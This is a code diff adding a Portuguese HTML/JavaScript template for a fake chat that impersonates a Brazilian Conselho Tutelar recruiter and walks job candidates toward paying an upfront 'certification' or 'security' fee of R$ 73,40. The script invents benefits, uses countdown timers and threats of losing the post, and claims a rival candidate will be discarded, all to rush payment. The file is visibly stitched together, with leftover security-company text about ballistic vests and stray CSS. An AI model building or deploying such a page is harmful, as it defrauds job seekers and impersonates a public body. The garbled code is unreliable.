@@ -1,0 +1,1236 @@
+{% extends "layout.html" %}
+
+{% block content %}
+<div class="max-w-sm mx-auto px-3 py-4">
+    <!-- Premium header -->
+    <div class="text-center mb-8">
+        <div class="bg-[#1451B4] text-white rounded-xl p-8 mb-6 shadow-2xl border-4 border-white relative overflow-hidden">
+            <!-- Premium accent border -->
+            <div class="absolute top-0 left-0 w-full h-1 bg-white opacity-30"></div>
+            <div class="absolute bottom-0 left-0 w-full h-1 bg-white opacity-30"></div>
+            
+            <!-- Content with enhanced spacing -->
+            <div class="relative z-10">
+                <div class="inline-block p-4 bg-white bg-opacity-10 rounded-full mb-4">
+                    <i class="fas fa-comments text-4xl"></i>
+                </div>
+                <h1 class="text-3xl font-bold tracking-wide mb-2">Chat RH</h1>
+                <div class="w-24 h-0.5 bg-white mx-auto mb-3 opacity-60"></div>
+                <p class="text-lg font-medium opacity-95">Conselheiro Tutelar</p>
+                <p class="text-sm opacity-75 mt-2">Suporte ao Candidato</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile chat container -->
+    <div class="bg-white rounded-lg shadow-sm border overflow-hidden">
+        <!-- Chat header -->
+        <div class="bg-[#1451B4] text-white p-4">
+            <div class="flex items-center">
+                <div class="w-8 h-8 bg-white/20 rounded-full flex items-center justify-center mr-3">
+                    <i class="fas fa-user-tie text-sm"></i>
+                </div>
+                <div>
+                    <h3 class="font-semibold text-sm">Recrutamento CT</h3>
+                    <p class="text-xs opacity-90">Processo Seletivo</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Chat messages -->
+        <div id="chat-messages" class="h-64 overflow-y-auto p-4 space-y-3">
+            <!-- Initial message -->
+            <div class="flex">
+                <div class="bg-gray-100 rounded-lg p-3 max-w-xs">
+                    <p class="text-xs text-gray-800">Olá! Parabéns por se inscrever no processo seletivo para Conselheiro Tutelar. Como posso ajudá-lo?</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Chat input -->
+        <div class="border-t p-4">
+            <div class="flex space-x-2">
+                <input type="text" id="chat-input" placeholder="Digite sua mensagem..."
+                    class="flex-1 p-2 border border-gray-200 rounded-lg text-sm focus:border-[#1451B4] focus:ring-1 focus:ring-[#1451B4]">
+                <button onclick="sendMessage()" class="bg-[#1451B4] text-white p-2 rounded-lg hover:bg-[#0c326f] transition-colors">
+                    <i class="fas fa-paper-plane text-sm"></i>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Quick actions -->
+    <div class="mt-4 grid grid-cols-2 gap-2">
+        <button onclick="sendQuickMessage('Como funciona o processo?')" class="bg-blue-50 text-[#1451B4] p-3 rounded-lg text-xs border hover:bg-blue-100 transition-colors">
+            <i class="fas fa-question-circle mr-1"></i>Processo
+        </button>
+        <button onclick="sendQuickMessage('Quais são os requisitos?')" class="bg-blue-50 text-[#1451B4] p-3 rounded-lg text-xs border hover:bg-blue-100 transition-colors">
+            <i class="fas fa-list-check mr-1"></i>Requisitos
+        </button>
+    </div>
+</div>
+
+<script>
+// Mobile-optimized chat functionality
+function sendMessage() {
+    const input = document.getElementById('chat-input');
+    const message = input.value.trim();
+    if (!message) return;
+    
+    addMessage(message, 'user');
+    input.value = '';
+    
+    // Simulate response
+    setTimeout(() => {
+        const response = getResponse(message);
+        addMessage(response, 'bot');
+    }, 1000);
+}
+
+function sendQuickMessage(message) {
+    addMessage(message, 'user');
+    setTimeout(() => {
+        const response = getResponse(message);
+        addMessage(response, 'bot');
+    }, 1000);
+}
+
+function addMessage(text, type) {
+    const messages = document.getElementById('chat-messages');
+    const messageDiv = document.createElement('div');
+    messageDiv.className = type === 'user' ? 'flex justify-end' : 'flex';
+    
+    const bubble = document.createElement('div');
+    bubble.className = type === 'user' 
+        ? 'bg-[#1451B4] text-white rounded-lg p-3 max-w-xs ml-auto'
+        : 'bg-gray-100 rounded-lg p-3 max-w-xs';
+    
+    const textEl = document.createElement('p');
+    textEl.className = 'text-xs';
+    textEl.textContent = text;
+    
+    bubble.appendChild(textEl);
+    messageDiv.appendChild(bubble);
+    messages.appendChild(messageDiv);
+    messages.scrollTop = messages.scrollHeight;
+}
+
+function getResponse(message) {
+    const responses = {
+        'processo': 'O processo tem 3 etapas: 1) Inscrição online, 2) Avaliação ECA, 3) Resultado em 48h.',
+        'requisitos': 'Requisitos: Ensino médio completo, idade 21-65 anos, residir no município.',
+        'default': 'Obrigado pela pergunta! Para mais informações específicas, entre em contato com nossa equipe de recrutamento.'
+    };
+    
+    const key = Object.keys(responses).find(k => 
+        message.toLowerCase().includes(k) || message.toLowerCase().includes('como funciona')
+    ) || 'default';
+    
+    return responses[key];
+}
+
+// Enter key support
+document.addEventListener('DOMContentLoaded', function() {
+    document.getElementById('chat-input').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+            sendMessage();
+        }
+    });
+});
+</script>
+{% endblock %}
+    
+    .prosegur-container {
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 20px;
+    }
+    
+    .prosegur-card {
+        background-color: #fff;
+        border-radius: 12px;
+        box-shadow: 0 8px 24px rgba(0,0,0,0.08);
+        overflow: hidden;
+    }
+    
+    .prosegur-card-header {
+        background: linear-gradient(90deg, var(--prosegur-black) 0%, var(--prosegur-gray) 100%);
+        color: white;
+        padding: 12px 20px;
+        position: relative;
+        border-radius: 12px;
+        box-shadow: 0 8px 24px rgba(0,0,0,0.08);
+    }
+    
+    .profile-header-img {
+        width: 46px;
+        height: 46px;
+        border-radius: 50%;
+        object-fit: cover;
+        border: 2px solid var(--prosegur-blue);
+        box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+    }
+    
+    .chat-container {
+        overflow-y: auto;
+        padding: 10px 20px;
+        scroll-behavior: smooth;
+        display: flex;
+        flex-direction: column;
+    }
+    
+    .chat-container::-webkit-scrollbar {
+        width: 6px;
+    }
+    
+    .chat-container::-webkit-scrollbar-track {
+        background: #f1f1f1;
+    }
+    
+    .chat-container::-webkit-scrollbar-thumb {
+        background: #c9c9c9;
+        border-radius: 10px;
+    }
+    
+    .chat-container::-webkit-scrollbar-thumb:hover {
+        background: #a0a0a0;
+    }
+    
+    .message-bubble {
+        margin-bottom: 16px;
+        max-width: 75%;
+        position: relative;
+        display: flex;
+        flex-direction: column;
+    }
+    
+    .incoming-message {
+        align-self: flex-start;
+        margin-right: auto;
+        padding-left: 0px;
+        margin-left: -10px;
+    }
+    
+    .outgoing-message {
+        align-self: flex-end;
+        margin-left: auto;
+        align-items: flex-end;
+        padding-right: 0px;
+        margin-right: -10px;
+    }
+    
+    .message-content {
+        padding: 14px 18px;
+        border-radius: 18px;
+        box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        margin-top: 4px;
+        position: relative;
+        line-height: 1.5;
+    }
+    
+    .long-message {
+        border-left: 3px solid var(--prosegur-blue);
+        padding-left: 20px;
+    }
+    
+    .incoming-message .message-content {
+        background-color: var(--prosegur-black);
+        border-top-left-radius: 2px;
+        text-align: left;
+        color: white;
+        min-width: 200px;
+    }
+    
+    .outgoing-message .message-content {
+        background-color: #d4d4d4;
+        border-top-right-radius: 2px;
+        text-align: right;
+        border-right: 2px solid #999;
+    }
+    
+    .message-sender {
+        font-weight: 600;
+        font-size: 0.85rem;
+        margin-bottom: 2px;
+        color: var(--prosegur-black);
+    }
+    
+    .message-time {
+        font-size: 0.7rem;
+        color: #999;
+        margin-top: 4px;
+        display: none;
+    }
+    
+    .show-time .message-time {
+        display: block;
+    }
+    
+    .typing-indicator {
+        padding: 10px 12px;
+        background-color: #f1f1f1;
+        border-radius: 18px;
+        margin-bottom: 16px;
+        display: inline-block;
+        align-self: flex-start;
+        color: #666;
+        max-width: 75px;
+    }
+    
+    .chat-avatar {
+        width: 46px;
+        height: 46px;
+        border-radius: 50%;
+        object-fit: cover;
+        border: 2px solid var(--prosegur-blue);
+        box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+    }
+    
+
+    
+    .status-indicator {
+        position: absolute;
+        bottom: 0;
+        right: 0;
+        width: 14px;
+        height: 14px;
+        border-radius: 50%;
+        background-color: var(--prosegur-success);
+        border: 2px solid white;
+    }
+    
+    .chat-options {
+        margin-top: 10px;
+        margin-bottom: 20px;
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+        padding-left: 0px;
+        margin-left: -10px;
+        max-width: 75%;
+    }
+    
+    .option-button {
+        background: linear-gradient(145deg, #e6e6e6, #f8f8f8);
+        border: 1px solid #d0d0d0;
+        border-radius: 12px;
+        padding: 16px 20px;
+        text-align: left;
+        transition: all 0.2s ease;
+        cursor: pointer;
+        font-weight: 500;
+        box-shadow: 
+            0 4px 8px rgba(0,0,0,0.1),
+            inset 0 1px 0 rgba(255,255,255,0.5),
+            inset 0 -1px 0 rgba(0,0,0,0.1);
+        font-size: 1.05rem;
+        margin-bottom: 12px;
+        color: #333;
+    }
+    
+    .option-button:hover {
+        background: linear-gradient(145deg, #f0f0f0, #ffffff);
+        border-color: var(--prosegur-blue);
+        transform: translateY(-2px);
+        box-shadow: 
+            0 6px 16px rgba(0,0,0,0.15),
+            inset 0 1px 0 rgba(255,255,255,0.7),
+            inset 0 -1px 0 rgba(0,0,0,0.05);
+    }
+    
+    .option-button:active {
+        transform: translateY(0px);
+        box-shadow: 
+            0 2px 4px rgba(0,0,0,0.2),
+            inset 0 1px 0 rgba(0,0,0,0.1),
+            inset 0 -1px 0 rgba(255,255,255,0.3);
+    }
+    
+    .option-button.selected {
+        background: var(--prosegur-blue);
+        color: var(--prosegur-black);
+        border-color: var(--prosegur-blue);
+        box-shadow: 
+            0 2px 4px rgba(255,204,0,0.3),
+            inset 0 1px 0 rgba(255,255,255,0.3),
+            inset 0 -1px 0 rgba(0,0,0,0.1);
+    }
+    
+    .option-button i {
+        font-size: 1.2rem;
+        margin-right: 10px;
+        vertical-align: middle;
+    }
+    
+    .timer-container {
+        background-color: #fff3e0;
+        border-radius: 12px;
+        padding: 20px;
+        margin: 20px 16px;
+        text-align: center;
+        box-shadow: 0 4px 12px rgba(255, 152, 0, 0.15);
+        position: relative;
+        border-left: 4px solid var(--prosegur-warning);
+    }
+    
+    .timer-container::before {
+        content: "\f017";
+        font-family: "Font Awesome 5 Free";
+        font-weight: 900;
+        font-size: 1.2rem;
+        position: absolute;
+        top: 14px;
+        left: 14px;
+        color: var(--prosegur-warning);
+    }
+    
+    .timer {
+        font-size: 2.5rem;
+        font-weight: 700;
+        color: var(--prosegur-danger);
+        margin: 10px 0;
+        font-family: monospace;
+    }
+    
+    .timer-label {
+        font-size: 0.95rem;
+        color: #666;
+        margin-bottom: 15px;
+    }
+    
+    .action-button {
+        display: block;
+        background: linear-gradient(90deg, var(--prosegur-blue) 0%, #FFD700 100%);
+        color: var(--prosegur-black);
+        border: none;
+        border-radius: 30px;
+        padding: 14px 24px;
+        font-weight: 600;
+        letter-spacing: 0.5px;
+        transition: all 0.3s ease;
+        box-shadow: 0 4px 15px rgba(255, 204, 0, 0.3);
+        text-transform: uppercase;
+        text-decoration: none;
+        text-align: center;
+        margin-top: 10px;
+    }
+    
+    .action-button:hover {
+        transform: translateY(-3px);
+        box-shadow: 0 6px 20px rgba(255, 204, 0, 0.4);
+        color: var(--prosegur-black);
+    }
+    
+    .action-button i {
+        margin-right: 8px;
+    }
+    
+    .footer-note {
+        text-align: center;
+        font-size: 0.8rem;
+        color: #999;
+        margin-top: 20px;
+    }
+    
+    .prosegur-logo {
+        height: 32px;
+    }
+    
+    .header-title {
+        margin: 0;
+        font-weight: 600;
+        font-size: 1.1rem;
+    }
+    
+    .header-subtitle {
+        margin: 0;
+        font-size: 0.85rem;
+        opacity: 0.8;
+    }
+    
+    .avatar-container {
+        position: relative;
+        margin-right: 15px;
+        flex-shrink: 0;
+    }
+    
+    .typing-animation {
+        display: flex;
+        align-items: center;
+        column-gap: 5px;
+        height: 15px;
+    }
+    
+    .typing-animation .dot {
+        display: block;
+        width: 7px;
+        height: 7px;
+        opacity: 0.8;
+        border-radius: 50%;
+        background-color: white;
+        animation: loadingFade 1s infinite;
+    }
+    
+    .typing-animation .dot:nth-child(1) {
+        animation-delay: 0s;
+    }
+    
+    .typing-animation .dot:nth-child(2) {
+        animation-delay: 0.2s;
+    }
+    
+    .typing-animation .dot:nth-child(3) {
+        animation-delay: 0.4s;
+    }
+    
+    @keyframes loadingFade {
+        0% {
+            opacity: 0.3;
+            transform: scale(0.8);
+        }
+        50% {
+            opacity: 1;
+            transform: scale(1.2);
+        }
+        100% {
+            opacity: 0.3;
+            transform: scale(0.8);
+        }
+    }
+    
+    @keyframes fadeInDown {
+        from {
+            opacity: 0;
+            transform: translateY(-30px);
+        }
+        to {
+            opacity: 1;
+            transform: translateY(0);
+        }
+    }
+    
+    @keyframes fadeOutUp {
+        from {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        to {
+            opacity: 0;
+            transform: translateY(-30px);
+        }
+    }
+    
+    @keyframes pulseLight {
+        0% {
+            box-shadow: 0 0 0 0 rgba(255, 204, 0, 0.2);
+        }
+        70% {
+            box-shadow: 0 0 0 15px rgba(255, 204, 0, 0);
+        }
+        100% {
+            box-shadow: 0 0 0 0 rgba(255, 204, 0, 0);
+        }
+    }
+    
+    .fade-out-up {
+        animation: fadeOutUp 0.5s ease-out forwards;
+    }
+    
+    .hidden {
+        display: none !important;
+    }
+    
+    .fade-in {
+        animation: fadeIn 0.5s ease forwards;
+    }
+    
+    @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(10px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
+    
+    .highlight-pulse {
+        animation: highlightPulse 2s infinite;
+    }
+    
+    @keyframes highlightPulse {
+        0% { box-shadow: 0 0 0 0 rgba(255, 204, 0, 0.4); }
+        70% { box-shadow: 0 0 0 10px rgba(255, 204, 0, 0); }
+        100% { box-shadow: 0 0 0 0 rgba(255, 204, 0, 0); }
+    }
+    
+    @media (max-width: 576px) {
+        .message-bubble {
+            max-width: 85%;
+        }
+        
+        .chat-container {
+            height: 55vh;
+            padding: 15px;
+        }
+        
+        .timer {
+            font-size: 2.2rem;
+        }
+    }
+</style>
+
+<body>
+    <!-- Government Header -->
+    <header class="bg-[#222222] text-white py-2">
+        <div class="container mx-auto flex justify-between items-center px-4">
+            <a class="font-bold text-sm" href="#">
+                <img src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" alt="Logotipo Governo" class="h-6" />
+            </a>
+            <nav>
+                <ul class="flex space-x-4 text-[10px]">
+                    <li>
+                        <a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">PARTICIPE</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">SERVIÇOS</a>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+    <!-- CRAS Header -->
+    <div class="bg-[#044785] py-3">
+        <div class="container mx-auto px-4 text-center">
+            <img src="https://i.postimg.cc/5NvvmF2C/506e4525-b3e0-4703-85c5-24050ba28e3f-removalai-preview.png" alt="Logo Conselho Tutelar" class="h-8 mx-auto" />
+        </div>
+    </div>
+    <!-- Attendant Info -->
+    <div class="bg-gray-100 text-gray-800 px-4 md:px-8 py-3">
+        <div class="max-w-7xl mx-auto">
+            <div class="flex items-center w-full">
+                <div class="avatar-container mr-4">
+                    <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?w=150&h=150&fit=crop&crop=face" 
+                         class="chat-avatar" alt="Marina Santos">
+                    <span class="status-indicator"></span>
+                </div>
+                <div class="flex-1">
+                    <h2 class="header-title text-gray-800 text-lg font-semibold">Marina Santos</h2>
+                    <p class="header-subtitle text-gray-600 text-sm">Assistente Social - Conselho Tutelar</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <main class="container mx-auto px-4 py-2">
+        <div class="max-w-6xl mx-auto">
+    
+    <!-- Chat Body -->
+    <div class="overflow-hidden position-relative">
+        <div class="chat-container" id="chatContainer" style="height: calc(100vh - 200px); min-height: 400px;">
+            <!-- Messages will be inserted here by JavaScript -->
+        </div>
+        
+        <!-- Typing Indicator will be inserted dynamically -->
+    </div>
+    
+    <!-- Options will be inserted inline with messages -->
+    </main>
+
+<script>
+// Candidate data
+const candidateData = {
+    name: "{{ nome }}".trim() || "Candidato",
+    city: "{{ cidade }}".trim() || "São Paulo",
+    cpf: "{{ cpf }}".trim() || ""
+};
+
+// Format to show only first name
+const firstName = candidateData.name.split(' ')[0];
+
+// Chat sequence with Prosegur content
+const chatSequence = [
+    {
+        message: `Olá ${firstName}, tudo bem? Aqui é a Marina Santos, do Conselho Tutelar.`,
+        delay: 3000
+    },
+    {
+        message: "Estou entrando em contato sobre sua candidatura para Conselheiro Tutelar. Entre os candidatos aprovados no processo seletivo, alguns já confirmaram participação no treinamento. Para finalizar seu processo, preciso apenas confirmar alguns dados rapidamente com você.",
+        delay: 8000
+    },
+    {
+        message: "Todos os novos Conselheiros Tutelares aprovados receberão o seguinte auxílio e benefícios:",
+        delay: 3000
+    },
+    {
+        message: `Cargo: Conselheiro Tutelar\nAuxílio Mensal: R$ 4.200,00\nVale Alimentação: R$ 800,00 por mês\nBenefícios:\n• Auxílio transporte\n• Capacitação continuada em ECA\n• Auxílio material de escritório\n• Participação em congressos e seminários\n• Certificação profissional\n• Suporte jurídico institucional\n\n${firstName}, você ainda tem interesse na vaga de Conselheiro Tutelar em ${candidateData.city}?`,
+        delay: 6000,
+        longTypingTime: true,
+        showOptions: 'interestOptions'
+    }
+];
+
+// Conditional responses
+const interestExplanation = [
+    {
+        message: "Entendo sua decisão. Caso mude de ideia, sua vaga continuará disponível por mais 24 horas em nosso sistema.",
+        delay: 2500
+    },
+    {
+        message: "Se decidir prosseguir com a candidatura, basta acessar novamente o link que enviamos. Obrigada pelo seu tempo e atenção!",
+        delay: 3000
+    }
+];
+
+const startWorkResponses = {
+    showBenefits: [
+        {
+            message: "Perfeito! Obrigada por confirmar seu interesse. Agora vou fazer só mais algumas perguntas para finalizar o processo.",
+            delay: 2500
+        },
+        {
+            message: "Como Conselheiro Tutelar, você trabalhará em regime de dedicação integral, conforme a Lei nº 8.069/90 (ECA).",
+            delay: 3500
+        },
+        {
+            message: "O Conselho Tutelar fornecerá gratuitamente o Curso de Capacitação em ECA, que será realizado em 20 aulas de 3 horas cada.",
+            delay: 4000
+        },
+        {
+            message: "Com este curso, você receberá a Certificação Oficial de Conselheiro Tutelar, habilitando-o para atuar na proteção de crianças e adolescentes.",
+            delay: 4200
+        },
+        {
+            message: function() {
+                const trainingDate = localStorage.getItem('trainingDate') || 'data não informada';
+                const trainingTime = localStorage.getItem('trainingTime') || 'horário não informado';
+                return `Conforme seu agendamento, seu primeiro dia de treinamento será em ${trainingDate} no horário ${trainingTime}.`;
+            },
+            delay: 3800
+        },
+        {
+            message: function() {
+                const locationData = localStorage.getItem('trainingLocation');
+                if (locationData) {
+                    try {
+                        const location = JSON.parse(locationData);
+                        return `Você deverá comparecer com documento de identificação com foto, comprovante de escolaridade e dados bancários para cadastro no Conselho Tutelar.\n\n📍 Local de capacitação:\n${location.endereco}, ${location.bairro}\n${location.cidade} - CEP: ${location.cep}`;
+                    } catch (e) {
+                        return "Você deverá comparecer com documento de identificação com foto, comprovante de escolaridade e dados bancários para cadastro no Conselho Tutelar.";
+                    }
+                } else {
+                    return "Você deverá comparecer com documento de identificação com foto, comprovante de escolaridade e dados bancários para cadastro no Conselho Tutelar.";
+                }
+            },
+            delay: 4500,
+            showImage: 'https://i.ibb.co/gLpTqVH8/IMG-4524-1.jpg'
+        },
+        {
+            message: "Neste dia será iniciado o processo de posse e também haverá o primeiro dia do Curso de Capacitação em ECA, onde você aprenderá sobre direitos da criança e do adolescente.",
+            delay: 5000
+        },
+        {
+            message: "Como já foi informado, o Conselho Tutelar fornecerá os materiais de estudo e recursos necessários, mas você precisa realizar o pagamento da taxa de certificação que será usada em todo o curso.",
+            delay: 4500,
+            showImage: 'https://i.ibb.co/Xf8G9m0p/assets-task-01jwtj2gbbfvp9n65m4ed1n78p-1748943129-img-1-1-1.png'
+        },
+        {
+            message: "Se trata da taxa de certificação oficial no valor de R$ 73,40. Essa é a única despesa que você terá no curso e serve para todo o processo de capacitação.",
+            delay: 4000
+        },
+        {
+            message: "Sem o pagamento, infelizmente não conseguirei agendar a capacitação e você pode perder a vaga de Conselheiro Tutelar a qualquer momento.",
+            delay: 3500
+        },
+        {
+            message: "Se você conseguir realizar o pagamento em até 10 minutos, consigo segurar sua vaga e não passar para outro candidato.",
+            delay: 3200
+        },
+        {
+            message: `${firstName}, você vai realizar o pagamento ou deseja desistir da vaga?`,
+            delay: 2800,
+            showOptions: 'paymentOptions'
+        }
+    ]
+};
+
+const paymentConfirmation = [
+    {
+        message: "Perfeito! Vou segurar sua vaga de Conselheiro Tutelar, mas você precisa realizar o pagamento da certificação e confirmar para mim o quanto antes.",
+        delay: 4000
+    },
+    {
+        message: "Para realizar o pagamento é só clicar no botão abaixo para acessar a guia de pagamento.",
+        delay: 4500,
+        showPaymentButton: true
+    }
+];
+
+const desistirExplanation = [
+    {
+        message: "Entendo sua decisão. Infelizmente sua vaga será liberada para outros candidatos. Caso mude de ideia, pode entrar em contato conosco novamente.",
+        delay: 4000
+    }
+];
+
+const paymentExplanation = [
+    {
+        message: "Excelente escolha! Vou descartar a candidatura do Carlos imediatamente e reservar a vaga exclusivamente para você.",
+        delay: 2500
+    },
+    {
+        message: "Para finalizar seu processo de contratação e confirmar o envio dos equipamentos necessários (uniforme, colete balístico e equipamentos de segurança), precisamos que você efetue o pagamento da Taxa de Segurança.",
+        delay: 3800
+    },
+    {
+        message: "Esta taxa de R$ 73,40 serve como uma garantia para o envio dos equipamentos, que têm valor superior a R$ 2.500,00. Infelizmente, já tivemos casos em que candidatos receberam os equipamentos e desistiram da vaga sem devolvê-los.",
+        delay: 4200
+    },
+    {
+        message: "É importante esclarecer que esta é uma medida de segurança exigida pelo nosso departamento financeiro para proteger o patrimônio da empresa. O valor será integralmente reembolsado no seu primeiro pagamento.",
+        delay: 3500
+    },
+    {
+        message: "Após a confirmação do pagamento, os equipamentos serão enviados em até 5 dias úteis para o endereço que você cadastrou em nosso sistema.",
+        delay: 3000
+    },
+    {
+        message: `${firstName}, posso definir um prazo de 5 minutos para você efetuar esse pagamento? Assim garantimos sua vaga e iniciamos imediatamente os procedimentos para o envio dos equipamentos.`,
+        delay: 3200,
+        showTimer: true
+    }
+];
+
+// DOM elements
+const chatContainer = document.getElementById('chatContainer');
+const interestOptions = document.getElementById('interestOptions');
+const startOptions = document.getElementById('startOptions');
+const holdOptions = document.getElementById('holdOptions');
+const timerContainer = document.getElementById('timerContainer');
+const timerElement = document.getElementById('timer');
+
+// Time formatting
+function getFormattedTime() {
+    const now = new Date();
+    return now.getHours().toString().padStart(2, '0') + ':' + 
+           now.getMinutes().toString().padStart(2, '0');
+}
+
+// Add message to chat
+function addMessage(message, isIncoming = true, showTime = false) {
+    // Remove show-time class from all previous messages
+    document.querySelectorAll('.message-bubble').forEach(bubble => {
+        bubble.classList.remove('show-time');
+    });
+    
+    const messageDiv = document.createElement('div');
+    messageDiv.className = `message-bubble ${isIncoming ? 'incoming-message' : 'outgoing-message'} fade-in`;
+    
+    // Add show-time class if this should show time
+    if (showTime) {
+        messageDiv.classList.add('show-time');
+    }
+    
+    const messageContent = document.createElement('div');
+    messageContent.className = 'message-content';
+    messageContent.innerHTML = message.replace(/\n/g, '<br>');
+    
+    const timeDiv = document.createElement('div');
+    timeDiv.className = 'message-time';
+    timeDiv.textContent = getFormattedTime();
+    
+    messageDiv.appendChild(messageContent);
+    messageDiv.appendChild(timeDiv);
+    chatContainer.appendChild(messageDiv);
+    
+    // Auto scroll to bottom smoothly
+    setTimeout(() => {
+        chatContainer.scrollTop = chatContainer.scrollHeight;
+    }, 100);
+}
+
+// Show typing indicator
+function showTyping(duration = 3000) {
+    return new Promise(resolve => {
+        // Create typing indicator
+        const typingDiv = document.createElement('div');
+        typingDiv.className = 'message-bubble incoming-message typing-indicator-bubble';
+        typingDiv.style.paddingLeft = '0px';
+        typingDiv.style.marginLeft = '-10px';
+        typingDiv.innerHTML = `
+            <div class="message-content d-flex align-items-center" style="background-color: var(--prosegur-black); color: white; min-width: 70px; max-width: 70px; border-radius: 18px; padding: 10px 15px;">
+                <div class="typing-animation">
+                    <span class="dot"></span>
+                    <span class="dot"></span>
+                    <span class="dot"></span>
+                </div>
+            </div>
+        `;
+        
+        // Add to chat container
+        chatContainer.appendChild(typingDiv);
+        chatContainer.scrollTop = chatContainer.scrollHeight;
+        
+        setTimeout(() => {
+            // Remove typing indicator
+            if (typingDiv.parentNode) {
+                typingDiv.parentNode.removeChild(typingDiv);
+            }
+            resolve();
+        }, duration);
+    });
+}
+
+// Hide all option groups
+function hideAllOptions() {
+    document.querySelectorAll('.chat-options').forEach(el => {
+        el.style.display = 'none';
+    });
+}
+
+// Show specific option group inline
+function showOptions(optionsId) {
+    let optionsHtml = '';
+    
+    if (optionsId === 'interestOptions') {
+        optionsHtml = `
+            <div class="chat-options">
+                <button class="option-button mb-2 d-block w-100 text-start" onclick="handleOptionClick(this, 'Sim, tenho interesse', 'showBenefits')">
+                    <i class="fas fa-check-circle" style="color: var(--prosegur-success);"></i> 
+                    Sim, tenho interesse
+                </button>
+                <button class="option-button d-block w-100 text-start" onclick="handleOptionClick(this, 'Não tenho interesse', 'showInterestExplanation')">
+                    <i class="fas fa-times-circle" style="color: var(--prosegur-danger);"></i> 
+                    Não tenho interesse
+                </button>
+            </div>
+        `;
+    } else if (optionsId === 'paymentOptions') {
+        optionsHtml = `
+            <div class="chat-options">
+                <button class="option-button mb-2 d-block w-100 text-start" onclick="handleOptionClick(this, 'Vou realizar o pagamento', 'showPaymentConfirmation')">
+                    Vou realizar o pagamento
+                </button>
+                <button class="option-button d-block w-100 text-start" onclick="handleOptionClick(this, 'Quero desistir da vaga', 'showDesistirExplanation')">
+                    Quero desistir da vaga
+                </button>
+            </div>
+        `;
+    } else if (optionsId === 'startOptions') {
+        optionsHtml = `
+            <div class="chat-options">
+                <button class="option-button mb-2 d-block w-100 text-start" onclick="handleOptionClick(this, 'Posso começar essa semana', 'showBenefits')">
+                    <i class="fas fa-calendar-check" style="color: var(--prosegur-success);"></i> 
+                    Posso começar essa semana
+                </button>
+                <button class="option-button d-block w-100 text-start" onclick="handleOptionClick(this, 'Apenas no mês que vem', 'showBenefits')">
+                    <i class="fas fa-calendar-alt" style="color: var(--prosegur-black);"></i> 
+                    Apenas no mês que vem
+                </button>
+            </div>
+        `;
+    } else if (optionsId === 'holdOptions') {
+        optionsHtml = `
+            <div class="chat-options">
+                <button class="option-button mb-2 d-block w-100 text-start" onclick="handleOptionClick(this, 'Sim, vou realizar o pagamento agora', 'showPaymentExplanation')">
+                    <i class="fas fa-check-circle" style="color: var(--prosegur-success);"></i> 
+                    Sim, vou realizar o pagamento agora
+                </button>
+            </div>
+        `;
+    }
+    
+    if (optionsHtml) {
+        chatContainer.insertAdjacentHTML('beforeend', optionsHtml);
+        chatContainer.scrollTop = chatContainer.scrollHeight;
+    }
+}
+
+// Handle option click
+function handleOptionClick(button, responseText, nextAction) {
+    // Add user response to chat
+    addMessage(responseText, false, true);
+    
+    // Remove the options container
+    const optionsContainer = button.closest('.chat-options');
+    if (optionsContainer) {
+        optionsContainer.remove();
+    }
+    
+    // Show typing and continue conversation
+    setTimeout(async () => {
+        if (nextAction === 'showInterestExplanation') {
+            await processMessageSequence(interestExplanation);
+        } else if (nextAction === 'showStartOptions') {
+            showOptions('startOptions');
+        } else if (nextAction === 'showBenefits') {
+            await sendSequence(startWorkResponses.showBenefits);
+        } else if (nextAction === 'showPaymentExplanation') {
+            await processMessageSequence(paymentExplanation);
+        } else if (nextAction === 'showPaymentConfirmation') {
+            await sendSequence(paymentConfirmation);
+        } else if (nextAction === 'showDesistirExplanation') {
+            await processMessageSequence(desistirExplanation);
+        }
+    }, 1000);
+}
+
+// Send message sequence for specific response
+async function sendSequence(responses) {
+    for (let i = 0; i < responses.length; i++) {
+        const response = responses[i];
+        
+        // Get message text (handle functions)
+        const messageText = typeof response.message === 'function' ? response.message() : response.message;
+        
+        // Show typing indicator
+        const typingDuration = response.longTypingTime ? 
+            Math.min(messageText.length * 120, 8000) : 
+            Math.min(messageText.length * 90, 6000);
+        
+        await showTyping(typingDuration);
+        
+        // Add message
+        addMessage(messageText, true, i === responses.length - 1);
+        
+        // Show image if specified
+        if (response.showImage) {
+            setTimeout(() => {
+                const imageDiv = document.createElement('div');
+                imageDiv.className = 'fade-in';
+                imageDiv.style.paddingLeft = '0px';
+                imageDiv.style.marginLeft = '-10px';
+                imageDiv.style.marginBottom = '15px';
+                imageDiv.innerHTML = `
+                    <img src="${response.showImage}" alt="Local de treinamento" style="max-width: 300px; width: 100%; height: auto; border-radius: 8px; margin: 10px 0;">
+                `;
+                chatContainer.appendChild(imageDiv);
+                chatContainer.scrollTop = chatContainer.scrollHeight;
+            }, 500);
+        }
+        
+        // Show timer if specified
+        if (response.showTimer) {
+            setTimeout(() => {
+                const timerHtml = `
+                    <div class="timer-container mx-auto highlight-pulse" style="max-width: 600px; margin: 20px 0;">
+                        <div class="timer" id="timer">05:00</div>
+                        <div class="timer-label">Tempo restante para garantir sua vaga</div>
+                        <a href="/pagamento" class="action-button">
+                            <i class="fas fa-lock"></i> Efetuar Pagamento da Taxa de Segurança
+                        </a>
+                        <p class="mt-2 small text-muted">
+                            O valor de R$ 73,40 será totalmente reembolsado no seu primeiro pagamento.
+                        </p>
+                    </div>
+                `;
+                chatContainer.insertAdjacentHTML('beforeend', timerHtml);
+                chatContainer.scrollTop = chatContainer.scrollHeight;
+                
+                // Start timer
